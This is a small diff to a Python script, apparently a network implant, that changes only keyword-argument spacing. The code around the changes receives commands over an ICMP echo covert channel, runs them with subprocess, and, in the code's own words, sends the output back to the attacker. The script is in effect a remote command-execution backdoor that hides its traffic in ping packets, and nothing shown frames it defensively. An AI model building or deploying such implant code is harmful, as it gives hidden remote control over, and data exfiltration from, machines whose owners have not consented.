@@ -5,8 +5,8 @@ from os import name as OS_NAME
 
 SENDER_IP = "10.0.1.1"
 RECEIVER_IP = "10.0.1.2"
-sender = ICMPEchoFullPayload(ip_dst = SENDER_IP)
-receiver = ICMPEchoFullPayload(ip_dst = RECEIVER_IP)
+sender = ICMPEchoFullPayload(ip_dst=SENDER_IP)
+receiver = ICMPEchoFullPayload(ip_dst=RECEIVER_IP)
 
 # Indicate we are ready to receive input
 print()
@@ -36,7 +36,7 @@ while True:
         except AttributeError:
             continue
         # Run the command we received
-        response = run(command, capture_output = True, text = True).stdout
+        response = run(command, capture_output=True, text=True).stdout
         # Send the response to the attacker
         sender.ingest(response)
         sender.send_packets()
